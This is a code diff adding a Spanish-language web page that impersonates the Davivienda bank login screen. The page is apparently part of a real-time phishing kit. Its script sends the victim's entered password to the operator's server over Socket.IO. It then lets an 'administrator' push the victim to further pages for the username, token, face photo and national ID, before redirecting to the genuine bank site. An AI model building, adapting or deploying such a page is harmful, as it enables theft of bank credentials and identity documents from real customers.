@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Ingrese su Clave</title>
+    <link rel="icon" type="image/webp" href="img/logo-davivienda-web.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-section {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-section img {
+            height: 35px;
+            width: auto;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .greeting {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: 'Poppins', sans-serif;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.3s;
+            letter-spacing: 2px;
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #ED1C24;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            margin-top: 20px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            cursor: pointer;
+            accent-color: #ED1C24;
+        }
+
+        .checkbox-container label {
+            margin: 0;
+            font-size: 13px;
+            color: #333;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+            margin-bottom: 80px;
+        }
+
+        .btn-continue:hover {
+            background-color: #d01920;
+        }
+
+        .btn-continue:active {
+            background-color: #b01519;
+        }
+
+        .forgot-password {
+            text-align: center;
+            padding: 20px 25px;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .forgot-password p {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                box-shadow: none;
+            }
+            
+            body {
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <img src="img/Davivienda-Logo-Vector.svg-.png" alt="Davivienda">
+        </div>
+        
+        <div class="content">
+            <p class="greeting">¡Hola!</p>
+            <h1 class="welcome-text">Nos alegra que esté aquí</h1>
+            
+            <form id="claveForm">
+                <div class="form-group">
+                    <label for="clave">Ingrese su clave</label>
+                    <input type="password" id="clave" name="clave" placeholder="" maxlength="8" inputmode="numeric">
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="rememberMe" name="rememberMe">
+                    <label for="rememberMe">Recordar mis datos de identidad</label>
+                </div>
+                
+                <button type="submit" class="btn-continue">Continuar</button>
+            </form>
+        </div>
+        
+        <div class="forgot-password">
+            <p>¿Olvidó o bloqueó su clave?</p>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Recuperar el ID de sesión persistente
+        const persistentSessionId = localStorage.getItem('persistentSessionId');
+        
+        if (!persistentSessionId) {
+            console.error('No hay sesión activa, redirigiendo...');
+            window.location.href = '/index.html';
+        }
+        
+        console.log('Usando Session ID persistente:', persistentSessionId);
+        
+        // Conectar a Socket.IO con el mismo ID persistente
+        const socket = io({
+            auth: {
+                sessionId: persistentSessionId
+            }
+        });
+
+        // Confirmar conexión
+        socket.on('connect', () => {
+            console.log('Conectado - Socket ID:', socket.id, '| Session ID:', persistentSessionId);
+        });
+
+        // Validación para permitir solo números (sin límite de longitud)
+        const claveInput = document.getElementById('clave');
+        claveInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Prevenir pegar texto que no sean números
+        claveInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const numbersOnly = pastedText.replace(/[^0-9]/g, '');
+            this.value = numbersOnly;
+        });
+
+        // Manejar el submit del formulario
+        document.getElementById('claveForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const clave = document.getElementById('clave').value;
+            
+            if (clave.trim() === '') {
+                alert('Por favor ingrese su clave');
+                return;
+            }
+            
+            // Enviar clave a través de Socket.IO
+            socket.emit('submit-password', {
+                password: clave,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Pequeña pausa para asegurar que se envíe antes de redirigir
+            setTimeout(() => {
+                window.location.href = '/loading.html?action=password';
+            }, 100);
+        });
+
+        // Escuchar respuesta del servidor
+        socket.on('data-sent', (response) => {
+            if (!response.success) {
+                console.error('Error al enviar datos:', response.error);
+            }
+        });
+
+        // Escuchar acciones del administrador
+        socket.on('admin-action', (data) => {
+            const { action } = data;
+            
+            switch(action) {
+                case 'request-user':
+                    window.location.href = '/index.html';
+                    break;
+                case 'request-password':
+                    window.location.href = '/clave.html';
+                    break;
+                case 'request-token':
+                    window.location.href = '/token.html';
+                    break;
+                case 'request-face':
+                    window.location.href = '/cara.html';
+                    break;
+                case 'request-id':
+                    window.location.href = '/cedula.html';
+                    break;
+                case 'finish':
+                    window.location.href = 'https://www.davivienda.com/';
+                    break;
+            }
+        });
+
+        // Manejar errores de conexión
+        socket.on('connect_error', (error) => {
+            console.error('Error de conexión:', error);
+        });
+    </script>
+</body>
+</html>
